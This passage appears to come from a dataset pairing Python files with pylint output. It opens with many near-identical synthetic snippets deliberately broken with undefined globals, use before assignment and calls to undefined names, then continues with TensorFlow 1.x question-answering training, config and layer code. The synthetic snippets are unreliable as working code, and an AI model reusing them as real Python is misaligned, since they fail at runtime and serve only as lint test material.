13   obj: str = d.date.today().strftime('%y-%m-%d')
",7 - error: global-variable-undefined
"1   import datetime
2   obj: str = d.date.today().strftime('%y-%m-%d')
3   NANOSECONDS = 1
4   
5   def foo():
6       global v
7       print(_x)
8       _x = 10
9       print(_x)
10   name()
11   print(NANOSECONDS)
12   import datetime
13   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
",7 - error: global-variable-undefined
"1   import datetime
2   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
3   f = 1
4   
5   def foo():
6       global v
7       print(value)
8       value = 10
9       print(value)
10   datetime()
11   print(f)
12   import datetime
13   v2: str = args.date.today().strftime('%y-%m-%d')
",7 - error: global-variable-undefined
"1   import datetime
2   v2: str = args.date.today().strftime('%y-%m-%d')
3   contents = 1
4   
5   def foo():
6       global v
7       print(item)
8       item = 10
9       print(item)
10   t()
11   print(contents)
12   import datetime
13   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
",7 - error: global-variable-undefined
"1   import datetime
2   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
3   doc = 1
4   
5   def foo():
6       global v
7       print(nearest_int)
8       nearest_int = 10
9       print(nearest_int)
10   i()
11   print(doc)
12   import datetime
13   na_rm: str = doc.date.today().strftime('%y-%m-%d')
",7 - error: global-variable-undefined
"1   import datetime
2   na_rm: str = doc.date.today().strftime('%y-%m-%d')
3   _get = 1
4   
5   def foo():
6       global v
7       print(t)
8       t = 10
9       print(t)
10   ABC()
11   print(_get)
12   import datetime
13   v1: str = log_format.date.today().strftime('%y-%m-%d')
",7 - error: global-variable-undefined
"1   import datetime
2   v1: str = log_format.date.today().strftime('%y-%m-%d')
3   accuracy = 1
4   
5   def foo():
6       global v
7       print(i)
8       i = 10
9       print(i)
10   breaks_()
11   print(accuracy)
12   import datetime
13   v2: str = c.date.today().strftime('%y-%m-%d')
",7 - error: global-variable-undefined
"1   import datetime
2   v2: str = c.date.today().strftime('%y-%m-%d')
3   MethodType = 1
4   
5   def foo():
6       global v
7       print(self)
8       self = 10
9       print(self)
10   nearest_int()
11   print(MethodType)
12   import datetime
13   func: str = v1.date.today().strftime('%y-%m-%d')
",7 - error: global-variable-undefined
"1   import datetime
2   func: str = v1.date.today().strftime('%y-%m-%d')
3   v1_to_v2_map = 1
4   
5   def foo():
6       global v
7       print(na_rm)
8       na_rm = 10
9       print(na_rm)
10   x()
11   print(v1_to_v2_map)
12   import datetime
13   v: str = contents.date.today().strftime('%y-%m-%d')
",7 - error: global-variable-undefined
"1   import datetime
2   v: str = contents.date.today().strftime('%y-%m-%d')
3   trans = 1
4   
5   def foo():
6       global v
7       print(log_trans)
8       log_trans = 10
9       print(log_trans)
10   probit_trans()
11   print(trans)
12   import datetime
13   c: str = transform.date.today().strftime('%y-%m-%d')
",7 - error: global-variable-undefined
"1   import datetime
2   c: str = transform.date.today().strftime('%y-%m-%d')
3   y = 1
4   
5   def foo():
6       global v
7       print(log_format)
8       log_format = 10
9       print(log_format)
10   v2()
11   print(y)
12   import datetime
13   reduce: str = BaseClass.date.today().strftime('%y-%m-%d')
",7 - error: global-variable-undefined
"1   
2   import data_helper
3   import time
4   import datetime
5   import os
6   import tensorflow as tf
7   
8   import numpy as np
9   import evaluation
10   now = int(time.time()) 
11       
12   timeArray = time.localtime(now)
13   timeStamp = time.strftime(""%Y%m%d%H%M%S"", timeArray)
14   timeDay = time.strftime(""%Y%m%d"", timeArray)
15   print (timeStamp)
16   
17   def main(args):
18       args._parse_flags()
19       print(""\nParameters:"")
20       for attr, value in sorted(args.__flags.items()):
21           print((""{}={}"".format(attr.upper(), value)))
22       log_dir = 'log/'+ timeDay
23       if not os.path.exists(log_dir):
24           os.makedirs(log_dir)
25       data_file = log_dir + '/test_' + args.data + timeStamp
26       precision = data_file + 'precise'
27       print('load data ...........')
28       train,test,dev = data_helper.load(args.data,filter = args.clean)
29   
30       q_max_sent_length = max(map(lambda x:len(x),train['question'].str.split()))
31       a_max_sent_length = max(map(lambda x:len(x),train['answer'].str.split()))
32   
33       alphabet = data_helper.get_alphabet([train,test,dev])
34       print('the number of words',len(alphabet))
35   
36       print('get embedding')
37       if args.data==""quora"":
38           embedding = data_helper.get_embedding(alphabet,language=""cn"")
39       else:
40           embedding = data_helper.get_embedding(alphabet)
41       
42       
43   
44       with tf.Graph().as_default(), tf.device(""/gpu:"" + str(args.gpu)):
45           # with tf.device(""/cpu:0""):
46           session_conf = tf.ConfigProto()
47           session_conf.allow_soft_placement = args.allow_soft_placement
48           session_conf.log_device_placement = args.log_device_placement
49           session_conf.gpu_options.allow_growth = True
50           sess = tf.Session(config=session_conf)
51   
52           model = QA_CNN_extend(max_input_left = q_max_sent_length,
53               max_input_right = a_max_sent_length,
54               batch_size = args.batch_size,
55               vocab_size = len(alphabet),
56               embedding_size = args.embedding_dim,
57               filter_sizes = list(map(int, args.filter_sizes.split("",""))),
58               num_filters = args.num_filters, 
59               hidden_size = args.hidden_size,
60               dropout_keep_prob = args.dropout_keep_prob,
61               embeddings = embedding,
62               l2_reg_lambda = args.l2_reg_lambda,
63               trainable = args.trainable,
64               pooling = args.pooling,
65               conv = args.conv)
66   
67           model.build_graph()
68   
69           sess.run(tf.global_variables_initializer())
70           def train_step(model,sess,batch):
71               for data in batch:
72                   feed_dict = {
73                       model.question:data[0],
74                       model.answer:data[1],
75                       model.answer_negative:data[2],
76                       model.q_mask:data[3],
77                       model.a_mask:data[4],
78                       model.a_neg_mask:data[5]
79   
80                   }
81                   _, summary, step, loss, accuracy,score12, score13, see = sess.run(
82                           [model.train_op, model.merged,model.global_step,model.loss, model.accuracy,model.score12,model.score13, model.see],
83                           feed_dict)
84                   time_str = datetime.datetime.now().isoformat()
85                   print(""{}: step {}, loss {:g}, acc {:g} ,positive {:g},negative {:g}"".format(time_str, step, loss, accuracy,np.mean(score12),np.mean(score13)))
86           def predict(model,sess,batch,test):
87               scores = []
88               for data in batch:
89                   feed_dict = {
90                       model.question:data[0],
91                       model.answer:data[1],
92                       model.q_mask:data[2],
93                       model.a_mask:data[3]
94   
95                   }
96                   score = sess.run(
97                           model.score12,
98                           feed_dict)
99                   scores.extend(score)
100         
101               return np.array(scores[:len(test)])
102           
103                   
104           
105   
106           
107           for i in range(args.num_epoches):
108               datas = data_helper.get_mini_batch(train,alphabet,args.batch_size)
109               train_step(model,sess,datas)
110               test_datas = data_helper.get_mini_batch_test(test,alphabet,args.batch_size)
111   
112               predicted_test = predict(model,sess,test_datas,test)
113               print(len(predicted_test))
114               print(len(test))
115               map_mrr_test = evaluation.evaluationBypandas(test,predicted_test)
116   
117               print('map_mrr test',map_mrr_test)
118   
119   
120   
121   
122   
123                   
124   
125   
126   
","17 - refactor: too-many-locals
18 - warning: protected-access
20 - warning: protected-access
30 - warning: unnecessary-lambda
31 - warning: unnecessary-lambda
52 - error: undefined-variable
81 - warning: unused-variable
81 - warning: unused-variable
26 - warning: unused-variable
107 - warning: unused-variable
"
"1   class Singleton(object):
2       __instance=None
3       def __init__(self):
4           pass
5       def getInstance(self):
6           if Singleton.__instance is None:
7               # Singleton.__instance=object.__new__(cls,*args,**kwd)
8               Singleton.__instance=self.get_test_flag()
9               print(""build FLAGS over"")
10           return Singleton.__instance
11       def get_test_flag(self):
12           import tensorflow as tf
13           flags = tf.app.flags
14           if len(flags.FLAGS.__dict__.keys())<=2:
15   
16               flags.DEFINE_integer(""embedding_size"",300, ""Dimensionality of character embedding (default: 128)"")
17               flags.DEFINE_string(""filter_sizes"", ""1,2,3,5"", ""Comma-separated filter sizes (default: '3,4,5')"")
18               flags.DEFINE_integer(""num_filters"", 64, ""Number of filters per filter size (default: 128)"")
19               flags.DEFINE_float(""dropout_keep_prob"", 1, ""Dropout keep probability (default: 0.5)"")
20               flags.DEFINE_float(""l2_reg_lambda"", 0.000001, ""L2 regularizaion lambda (default: 0.0)"")
21               flags.DEFINE_float(""learning_rate"", 5e-3, ""learn rate( default: 0.0)"")
22               flags.DEFINE_integer(""max_len_left"", 40, ""max document length of left input"")
23               flags.DEFINE_integer(""max_len_right"", 40, ""max document length of right input"")
24               flags.DEFINE_string(""loss"",""pair_wise"",""loss function (default:point_wise)"")
25               flags.DEFINE_integer(""hidden_size"",100,""the default hidden size"")
26               flags.DEFINE_string(""model_name"", ""cnn"", ""cnn or rnn"")
27   
28               # Training parameters
29               flags.DEFINE_integer(""batch_size"", 64, ""Batch Size (default: 64)"")
30               flags.DEFINE_boolean(""trainable"", False, ""is embedding trainable? (default: False)"")
31               flags.DEFINE_integer(""num_epoches"", 1000, ""Number of training epochs (default: 200)"")
32               flags.DEFINE_integer(""evaluate_every"", 500, ""Evaluate model on dev set after this many steps (default: 100)"")
33               flags.DEFINE_integer(""checkpoint_every"", 500, ""Save model after this many steps (default: 100)"")
34   
35               flags.DEFINE_string('data','wiki','data set')
36               flags.DEFINE_string('pooling','max','max pooling or attentive pooling')
37               flags.DEFINE_boolean('clean',True,'whether we clean the data')
38               flags.DEFINE_string('conv','wide','wide conv or narrow')
39               flags.DEFINE_integer('gpu',0,'gpu number')
40               # Misc Parameters
41               flags.DEFINE_boolean(""allow_soft_placement"", True, ""Allow device soft device placement"")
42               flags.DEFINE_boolean(""log_device_placement"", False, ""Log placement of ops on devices"")
43           return flags.FLAGS
44       def get_rnn_flag(self):
45           import tensorflow as tf
46           flags = tf.app.flags
47           if len(flags.FLAGS.__dict__.keys())<=2:
48   
49               flags.DEFINE_integer(""embedding_size"",300, ""Dimensionality of character embedding (default: 128)"")
50               flags.DEFINE_string(""filter_sizes"", ""1,2,3,5"", ""Comma-separated filter sizes (default: '3,4,5')"")
51               flags.DEFINE_integer(""num_filters"", 64, ""Number of filters per filter size (default: 128)"")
52               flags.DEFINE_float(""dropout_keep_prob"", 1, ""Dropout keep probability (default: 0.5)"")
53               flags.DEFINE_float(""l2_reg_lambda"", 0.000001, ""L2 regularizaion lambda (default: 0.0)"")
54               flags.DEFINE_float(""learning_rate"", 0.001, ""learn rate( default: 0.0)"")
55               flags.DEFINE_integer(""max_len_left"", 40, ""max document length of left input"")
56               flags.DEFINE_integer(""max_len_right"", 40, ""max document length of right input"")
57               flags.DEFINE_string(""loss"",""pair_wise"",""loss function (default:point_wise)"")
58               flags.DEFINE_integer(""hidden_size"",100,""the default hidden size"")
59               flags.DEFINE_string(""model_name"", ""rnn"", ""cnn or rnn"")
60   
61               # Training parameters
62               flags.DEFINE_integer(""batch_size"", 64, ""Batch Size (default: 64)"")
63               flags.DEFINE_boolean(""trainable"", False, ""is embedding trainable? (default: False)"")
64               flags.DEFINE_integer(""num_epoches"", 1000, ""Number of training epochs (default: 200)"")
65               flags.DEFINE_integer(""evaluate_every"", 500, ""Evaluate model on dev set after this many steps (default: 100)"")
66               flags.DEFINE_integer(""checkpoint_every"", 500, ""Save model after this many steps (default: 100)"")
67   
68   
69   #            flags.DEFINE_string('data','8008','data set')
70   
71               flags.DEFINE_string('data','trec','data set')
72   
73               flags.DEFINE_string('pooling','max','max pooling or attentive pooling')
74               flags.DEFINE_boolean('clean',False,'whether we clean the data')
75               flags.DEFINE_string('conv','wide','wide conv or narrow')
76               flags.DEFINE_integer('gpu',0,'gpu number')
77               # Misc Parameters
78               flags.DEFINE_boolean(""allow_soft_placement"", True, ""Allow device soft device placement"")
79               flags.DEFINE_boolean(""log_device_placement"", False, ""Log placement of ops on devices"")
80           return flags.FLAGS
81       def get_cnn_flag(self):
82           import tensorflow as tf
83           flags = tf.app.flags
84           if len(flags.FLAGS.__dict__.keys())<=2:
85   
86               flags.DEFINE_integer(""embedding_size"",300, ""Dimensionality of character embedding (default: 128)"")
87               flags.DEFINE_string(""filter_sizes"", ""1,2,3,5"", ""Comma-separated filter sizes (default: '3,4,5')"")
88               flags.DEFINE_integer(""num_filters"", 64, ""Number of filters per filter size (default: 128)"")
89               flags.DEFINE_float(""dropout_keep_prob"", 0.8, ""Dropout keep probability (default: 0.5)"")
90               flags.DEFINE_float(""l2_reg_lambda"", 0.000001, ""L2 regularizaion lambda (default: 0.0)"")
91               flags.DEFINE_float(""learning_rate"", 5e-3, ""learn rate( default: 0.0)"")
92               flags.DEFINE_integer(""max_len_left"", 40, ""max document length of left input"")
93               flags.DEFINE_integer(""max_len_right"", 40, ""max document length of right input"")
94               flags.DEFINE_string(""loss"",""pair_wise"",""loss function (default:point_wise)"")
95               flags.DEFINE_integer(""hidden_size"",100,""the default hidden size"")
96               flags.DEFINE_string(""model_name"", ""cnn"", ""cnn or rnn"")
97   
98               # Training parameters
99               flags.DEFINE_integer(""batch_size"", 64, ""Batch Size (default: 64)"")
100               flags.DEFINE_boolean(""trainable"", False, ""is embedding trainable? (default: False)"")
101               flags.DEFINE_integer(""num_epoches"", 1000, ""Number of training epochs (default: 200)"")
102               flags.DEFINE_integer(""evaluate_every"", 500, ""Evaluate model on dev set after this many steps (default: 100)"")
103               flags.DEFINE_integer(""checkpoint_every"", 500, ""Save model after this many steps (default: 100)"")
104   
105               flags.DEFINE_string('data','wiki','data set')
106               flags.DEFINE_string('pooling','max','max pooling or attentive pooling')
107               flags.DEFINE_boolean('clean',True,'whether we clean the data')
108               flags.DEFINE_string('conv','wide','wide conv or narrow')
109               flags.DEFINE_integer('gpu',0,'gpu number')
110               # Misc Parameters
111               flags.DEFINE_boolean(""allow_soft_placement"", True, ""Allow device soft device placement"")
112               flags.DEFINE_boolean(""log_device_placement"", False, ""Log placement of ops on devices"")
113           return flags.FLAGS
114   
115   
116       def get_qcnn_flag(self):
117   
118           import tensorflow as tf
119           flags = tf.app.flags
120           if len(flags.FLAGS.__dict__.keys())<=2:
121   
122   
123               flags.DEFINE_integer(""embedding_size"",300, ""Dimensionality of character embedding (default: 128)"")
124               flags.DEFINE_string(""filter_sizes"", ""1,2,3,5"", ""Comma-separated filter sizes (default: '3,4,5')"")
125               flags.DEFINE_integer(""num_filters"", 128, ""Number of filters per filter size (default: 128)"")
126               flags.DEFINE_float(""dropout_keep_prob"", 0.8, ""Dropout keep probability (default: 0.5)"")
127               flags.DEFINE_float(""l2_reg_lambda"", 0.000001, ""L2 regularizaion lambda (default: 0.0)"")
128               flags.DEFINE_float(""learning_rate"", 0.001, ""learn rate( default: 0.0)"")
129   
130               flags.DEFINE_integer(""max_len_left"", 40, ""max document length of left input"")
131               flags.DEFINE_integer(""max_len_right"", 40, ""max document length of right input"")
132               flags.DEFINE_string(""loss"",""pair_wise"",""loss function (default:point_wise)"")
133               flags.DEFINE_integer(""hidden_size"",100,""the default hidden size"")
134   
135               flags.DEFINE_string(""model_name"", ""qcnn"", ""cnn or rnn"")
136   
137   
138               # Training parameters
139               flags.DEFINE_integer(""batch_size"", 64, ""Batch Size (default: 64)"")
140               flags.DEFINE_boolean(""trainable"", False, ""is embedding trainable? (default: False)"")
141               flags.DEFINE_integer(""num_epoches"", 1000, ""Number of training epochs (default: 200)"")
142               flags.DEFINE_integer(""evaluate_every"", 500, ""Evaluate model on dev set after this many steps (default: 100)"")
143               flags.DEFINE_integer(""checkpoint_every"", 500, ""Save model after this many steps (default: 100)"")
144   
145   
146               flags.DEFINE_string('data','wiki','data set')
147               flags.DEFINE_string('pooling','mean','max pooling or attentive pooling')
148   
149               flags.DEFINE_boolean('clean',True,'whether we clean the data')
150               flags.DEFINE_string('conv','wide','wide conv or narrow')
151               flags.DEFINE_integer('gpu',0,'gpu number')
152               # Misc Parameters
153               flags.DEFINE_boolean(""allow_soft_placement"", True, ""Allow device soft device placement"")
154               flags.DEFINE_boolean(""log_device_placement"", False, ""Log placement of ops on devices"")
155           return flags.FLAGS
156   
157       def get_8008_flag(self):
158           import tensorflow as tf
159           flags = tf.app.flags
160           if len(flags.FLAGS.__dict__.keys())<=2:
161   
162               flags.DEFINE_integer(""embedding_size"",200, ""Dimensionality of character embedding (default: 128)"")
163               flags.DEFINE_string(""filter_sizes"", ""1,2,3,5"", ""Comma-separated filter sizes (default: '3,4,5')"")
164               flags.DEFINE_integer(""num_filters"", 64, ""Number of filters per filter size (default: 128)"")
165               flags.DEFINE_float(""dropout_keep_prob"", 0.8, ""Dropout keep probability (default: 0.5)"")
166               flags.DEFINE_float(""l2_reg_lambda"", 0.000001, ""L2 regularizaion lambda (default: 0.0)"")
167               flags.DEFINE_float(""learning_rate"", 1e-3, ""learn rate( default: 0.0)"")
168               flags.DEFINE_integer(""max_len_left"", 40, ""max document length of left input"")
169               flags.DEFINE_integer(""max_len_right"", 40, ""max document length of right input"")
170               flags.DEFINE_string(""loss"",""pair_wise"",""loss function (default:point_wise)"")
171               flags.DEFINE_integer(""hidden_size"",100,""the default hidden size"")
172               flags.DEFINE_string(""model_name"", ""rnn"", ""cnn or rnn"")
173   
174               # Training parameters
175               flags.DEFINE_integer(""batch_size"", 250, ""Batch Size (default: 64)"")
176               flags.DEFINE_boolean(""trainable"", False, ""is embedding trainable? (default: False)"")
177               flags.DEFINE_integer(""num_epoches"", 1000, ""Number of training epochs (default: 200)"")
178               flags.DEFINE_integer(""evaluate_every"", 500, ""Evaluate model on dev set after this many steps (default: 100)"")
179               flags.DEFINE_integer(""checkpoint_every"", 500, ""Save model after this many steps (default: 100)"")
180   
181               flags.DEFINE_string('data','8008','data set')
182               flags.DEFINE_string('pooling','max','max pooling or attentive pooling')
183               flags.DEFINE_boolean('clean',False,'whether we clean the data')
184               flags.DEFINE_string('conv','wide','wide conv or narrow')
185               flags.DEFINE_integer('gpu',0,'gpu number')
186               # Misc Parameters
187               flags.DEFINE_boolean(""allow_soft_placement"", True, ""Allow device soft device placement"")
188               flags.DEFINE_boolean(""log_device_placement"", False, ""Log placement of ops on devices"")
189           return flags.FLAGS
190   
191   
192   
193   
194   if __name__==""__main__"":
195       args=Singleton().get_test_flag()
196       for attr, value in sorted(args.__flags.items()):
197           print((""{}={}"".format(attr.upper(), value)))
198      ","1 - refactor: useless-object-inheritance
196 - warning: protected-access
"
"1   # -*- coding: utf-8 -*-
2   
3   from tensorflow import flags
4   import tensorflow as tf
5   from config import Singleton
6   import data_helper
7   
8   import datetime
9   import os
10   import models
11   import numpy as np
12   import evaluation
13   
14   from data_helper import log_time_delta,getLogger
15   
16   logger=getLogger()
17       
18   
19   
20   args = Singleton().get_rnn_flag()
21   #args = Singleton().get_8008_flag()
22   
23   args._parse_flags()
24   opts=dict()
25   logger.info(""\nParameters:"")
26   for attr, value in sorted(args.__flags.items()):
27       logger.info((""{}={}"".format(attr.upper(), value)))
28       opts[attr]=value
29   
30   
31   train,test,dev = data_helper.load(args.data,filter = args.clean)
32   
33   q_max_sent_length = max(map(lambda x:len(x),train['question'].str.split()))
34   a_max_sent_length = max(map(lambda x:len(x),train['answer'].str.split()))
35   
36   alphabet = data_helper.get_alphabet([train,test,dev],dataset=args.data )
37   logger.info('the number of words :%d '%len(alphabet))
38   
39   if args.data==""quora"" or  args.data==""8008"" :
40       print(""cn embedding"")
41       embedding = data_helper.get_embedding(alphabet,dim=200,language=""cn"",dataset=args.data )
42       train_data_loader = data_helper.getBatch48008
43   else:
44       embedding = data_helper.get_embedding(alphabet,dim=300,dataset=args.data )
45       train_data_loader = data_helper.get_mini_batch
46   opts[""embeddings""] =embedding
47   opts[""vocab_size""]=len(alphabet)
48   opts[""max_input_right""]=a_max_sent_length
49   opts[""max_input_left""]=q_max_sent_length
50   opts[""filter_sizes""]=list(map(int, args.filter_sizes.split("","")))
51   
52   print(""innitilize over"")
53   
54   
55      
56    
57   #with tf.Graph().as_default(), tf.device(""/gpu:"" + str(args.gpu)):
58   with tf.Graph().as_default():    
59       # with tf.device(""/cpu:0""):
60       session_conf = tf.ConfigProto()
61       session_conf.allow_soft_placement = args.allow_soft_placement
62       session_conf.log_device_placement = args.log_device_placement
63       session_conf.gpu_options.allow_growth = True
64       sess = tf.Session(config=session_conf)
65       model=models.setup(opts)
66       model.build_graph()    
67       saver = tf.train.Saver()
68       sess.run(tf.global_variables_initializer())  # fun first than print or save
69       
70       
71       ckpt = tf.train.get_checkpoint_state(""checkpoint"")    
72       if ckpt and ckpt.model_checkpoint_path:    
73           # Restores from checkpoint    
74           saver.restore(sess, ckpt.model_checkpoint_path)
75       print(sess.run(model.position_embedding)[0])
76       if os.path.exists(""model"") :                        
77           import shutil
78           shutil.rmtree(""model"")
79       builder = tf.saved_model.builder.SavedModelBuilder(""./model"")
80       builder.add_meta_graph_and_variables(sess, [tf.saved_model.tag_constants.SERVING])
81       builder.save(True)
82       variable_averages = tf.train.ExponentialMovingAverage(  model)    
83       variables_to_restore = variable_averages.variables_to_restore()    
84       saver = tf.train.Saver(variables_to_restore)  
85       for name in variables_to_restore:    
86           print(name) 
87      
88       @log_time_delta
89       def predict(model,sess,batch,test):
90           scores = []
91           for data in batch:            
92               score = model.predict(sess,data)
93               scores.extend(score)  
94           return np.array(scores[:len(test)])
95       
96       
97       text = ""怎么 提取 公积金 ？""
98     
99       splited_text=data_helper.encode_to_split(text,alphabet)
100   
101       mb_q,mb_q_mask = data_helper.prepare_data([splited_text])
102       mb_a,mb_a_mask = data_helper.prepare_data([splited_text])
103       
104       data = (mb_q,mb_a,mb_q_mask,mb_a_mask)
105       score = model.predict(sess,data)
106       print(score)
107       feed_dict = {
108                   model.question:data[0],
109                   model.answer:data[1],
110                   model.q_mask:data[2],
111                   model.a_mask:data[3],
112                   model.dropout_keep_prob_holder:1.0
113               }   
114       sess.run(model.position_embedding,feed_dict=feed_dict)[0]
115   
116       
117      ","23 - warning: protected-access
24 - refactor: use-dict-literal
26 - warning: protected-access
33 - warning: unnecessary-lambda
34 - warning: unnecessary-lambda
39 - refactor: consider-using-in
89 - warning: redefined-outer-name
89 - warning: redefined-outer-name
89 - warning: redefined-outer-name
91 - warning: redefined-outer-name
92 - warning: redefined-outer-name
114 - warning: expression-not-assigned
3 - warning: unused-import
8 - warning: unused-import
12 - warning: unused-import
"
"1   from .QA_CNN_pairwise import QA_CNN_extend as CNN
2   from .QA_RNN_pairwise import QA_RNN_extend as RNN
3   from .QA_CNN_quantum_pairwise import QA_CNN_extend as QCNN
4   def setup(opt):
5   	if opt[""model_name""]==""cnn"":
6   		model=CNN(opt)
7   	elif opt[""model_name""]==""rnn"":
8   		model=RNN(opt)
9   	elif opt['model_name']=='qcnn':
10   		model=QCNN(opt)
11   	else:
12   		print(""no model"")
13   		exit(0)
14   	return model
","5 - warning: bad-indentation
6 - warning: bad-indentation
7 - warning: bad-indentation
8 - warning: bad-indentation
9 - warning: bad-indentation
10 - warning: bad-indentation
11 - warning: bad-indentation
12 - warning: bad-indentation
13 - warning: bad-indentation
14 - warning: bad-indentation
1 - error: relative-beyond-top-level
2 - error: relative-beyond-top-level
3 - error: relative-beyond-top-level
13 - refactor: consider-using-sys-exit
"
"1   from my.general import flatten, reconstruct, add_wd, exp_mask
2   
3   import numpy as np
4   import tensorflow as tf
5   
6   _BIAS_VARIABLE_NAME = ""bias""
7   _WEIGHTS_VARIABLE_NAME = ""kernel""
8   
9   
10   
11   def linear(args, output_size, bias, bias_start=0.0, scope=None, squeeze=False, wd=0.0, input_keep_prob=1.0,
12              is_train=None):#, name_w='', name_b=''
13       # if args is None or (nest.is_sequence(args) and not args):
14       #     raise ValueError(""`args` must be specified"")
15       # if not nest.is_sequence(args):
16       #     args = [args]
17   
18       flat_args = [flatten(arg, 1) for arg in args]#[210,20]
19   
20       # if input_keep_prob < 1.0:
21       #     assert is_train is not None
22       flat_args = [tf.nn.dropout(arg, input_keep_prob) for arg in flat_args]
23       
24       total_arg_size = 0#[60]
25       shapes = [a.get_shape() for a in flat_args]
26       for shape in shapes:
27           if shape.ndims != 2:
28               raise ValueError(""linear is expecting 2D arguments: %s"" % shapes)
29           if shape[1].value is None:
30               raise ValueError(""linear expects shape[1] to be provided for shape %s, ""
31                          ""but saw %s"" % (shape, shape[1]))
32           else:
33               total_arg_size += shape[1].value
34       # print(total_arg_size)
35       # exit()
36       dtype = [a.dtype for a in flat_args][0]        
37   
38       # scope = tf.get_variable_scope()
39       with tf.variable_scope(scope) as outer_scope:
40           weights = tf.get_variable(_WEIGHTS_VARIABLE_NAME, [total_arg_size, output_size], dtype=dtype)
41           if len(flat_args) == 1:
42               res = tf.matmul(flat_args[0], weights)
43           else: 
44               res = tf.matmul(tf.concat(flat_args, 1), weights)
45           if not bias:
46               flat_out = res
47           else:
48               with tf.variable_scope(outer_scope) as inner_scope:
49                   inner_scope.set_partitioner(None)
50                   biases = tf.get_variable(
51                       _BIAS_VARIABLE_NAME, [output_size],
52                       dtype=dtype,
53                       initializer=tf.constant_initializer(bias_start, dtype=dtype))
54               flat_out = tf.nn.bias_add(res, biases)    
55   
56       out = reconstruct(flat_out, args[0], 1)
57   
58       if squeeze:
59           out = tf.squeeze(out, [len(args[0].get_shape().as_list())-1])
60       if wd:
61           add_wd(wd)
62   
63       return out
64   
65   def softmax(logits, mask=None, scope=None):
66       with tf.name_scope(scope or ""Softmax""):
67           if mask is not None:
68               logits = exp_mask(logits, mask)
69           flat_logits = flatten(logits, 1)
70           flat_out = tf.nn.softmax(flat_logits)
71           out = reconstruct(flat_out, logits, 1)
72   
73           return out
74   
75   
76   def softsel(target, logits, mask=None, scope=None):
77       """"""
78   
79       :param target: [ ..., J, d] dtype=float
80       :param logits: [ ..., J], dtype=float
81       :param mask: [ ..., J], dtype=bool
82       :param scope:
83       :return: [..., d], dtype=float
84       """"""
85       with tf.name_scope(scope or ""Softsel""):
86           a = softmax(logits, mask = mask)
87           target_rank = len(target.get_shape().as_list())
88           out = tf.reduce_sum(tf.expand_dims(a, -1) * target, target_rank - 2)
89           return out
90   
91   def highway_layer(arg, bias, bias_start=0.0, scope=None, wd=0.0, input_keep_prob=1.0):
92       with tf.variable_scope(scope or ""highway_layer""):
93           d = arg.get_shape()[-1]
94           trans = linear([arg], d, bias, bias_start=bias_start, scope='trans', wd=wd, input_keep_prob=input_keep_prob)
95           trans = tf.nn.relu(trans)
96           gate = linear([arg], d, bias, bias_start=bias_start, scope='gate', wd=wd, input_keep_prob=input_keep_prob)
97           gate = tf.nn.sigmoid(gate)
98           out = gate * trans + (1 - gate) * arg
99           return out
100   
101   
102   def highway_network(arg, num_layers, bias, bias_start=0.0, scope=None, wd=0.0, input_keep_prob=1.0):
103       with tf.variable_scope(scope or ""highway_network""):
104           prev = arg
105           cur = None
106           for layer_idx in range(num_layers):
107               cur = highway_layer(prev, bias, bias_start=bias_start, scope=""layer_{}"".format(layer_idx), wd=wd,
108                                   input_keep_prob=input_keep_prob)
109               prev = cur
110           return cur
111   
112   def conv1d(in_, filter_size, height, padding, keep_prob=1.0, scope=None):
113       with tf.variable_scope(scope or ""conv1d""):
114           num_channels = in_.get_shape()[-1]
115           filter_ = tf.get_variable(""filter"", shape=[1, height, num_channels, filter_size], dtype='float')
116           bias = tf.get_variable(""bias"", shape=[filter_size], dtype='float')
117           strides = [1, 1, 1, 1]
118           in_ = tf.nn.dropout(in_, keep_prob)
119           xxc = tf.nn.conv2d(in_, filter_, strides, padding) + bias  # [N*M, JX, W/filter_stride, d]
120           out = tf.reduce_max(tf.nn.relu(xxc), 2)  # [-1, JX, d]
121           return out
122   
123   
124   def multi_conv1d(in_, filter_sizes, heights, padding, keep_prob=1.0, scope=None):
125       with tf.variable_scope(scope or ""multi_conv1d""):
126           assert len(filter_sizes) == len(heights)
127           outs = []
128           for filter_size, height in zip(filter_sizes, heights):
129               if filter_size == 0:
130                   continue
131               out = conv1d(in_, filter_size, height, padding, keep_prob=keep_prob, scope=""conv1d_{}"".format(height))
132               outs.append(out)
133           concat_out = tf.concat(outs, axis=2)
134           return concat_out
135   
136   
137   if __name__ == '__main__':
138       a = tf.Variable(np.random.random(size=(2,2,4)))
139       b = tf.Variable(np.random.random(size=(2,3,4)))
140       c = tf.tile(tf.expand_dims(a, 2), [1, 1, 3, 1])
141       test = flatten(c,1)
142       out = reconstruct(test, c, 1)
143       d = tf.tile(tf.expand_dims(b, 1), [1, 2, 1, 1])
144       e = linear([c,d,c*d],1,bias = False,scope = ""test"",)
145       # f = softsel(d, e)
146       with tf.Session() as sess:
147           tf.global_variables_initializer().run()
148           print(sess.run(test))
149           print(sess.run(tf.shape(out)))
150           exit()
151           print(sess.run(tf.shape(a)))
152           print(sess.run(a))
153           print(sess.run(tf.shape(b)))
154           print(sess.run(b))
155           print(sess.run(tf.shape(c)))
156           print(sess.run(c))  
157           print(sess.run(tf.shape(d)))
158           print(sess.run(d))
159           print(sess.run(tf.shape(e)))
160           print(sess.run(e))
","11 - refactor: too-many-arguments
11 - refactor: too-many-positional-arguments
11 - refactor: too-many-locals
56 - warning: redefined-outer-name
29 - refactor: no-else-raise
12 - warning: unused-argument
71 - warning: redefined-outer-name
86 - warning: redefined-outer-name
88 - warning: redefined-outer-name
91 - refactor: too-many-arguments
91 - refactor: too-many-positional-arguments
93 - warning: redefined-outer-name
98 - warning: redefined-outer-name
102 - refactor: too-many-arguments
102 - refactor: too-many-positional-arguments
112 - refactor: too-many-arguments
112 - refactor: too-many-positional-arguments
120 - warning: redefined-outer-name
124 - refactor: too-many-arguments
124 - refactor: too-many-positional-arguments
131 - warning: redefined-outer-name
151 - warning: unreachable
150 - refactor: consider-using-sys-exit
"
"1   from tensorflow import flags
2   import tensorflow as tf
3   from config import Singleton
4   import data_helper
5   
6   import datetime,os
7   
8   import models
9   import numpy as np
10   import evaluation
11   
12   import sys
13   import logging
14   
15   import time
16   now = int(time.time())
17   timeArray = time.localtime(now)
18   timeStamp = time.strftime(""%Y%m%d%H%M%S"", timeArray)
19   log_filename = ""log/"" +time.strftime(""%Y%m%d"", timeArray)
20   
21   program = os.path.basename('program')
22   logger = logging.getLogger(program) 
23   if not os.path.exists(log_filename):
24       os.makedirs(log_filename)
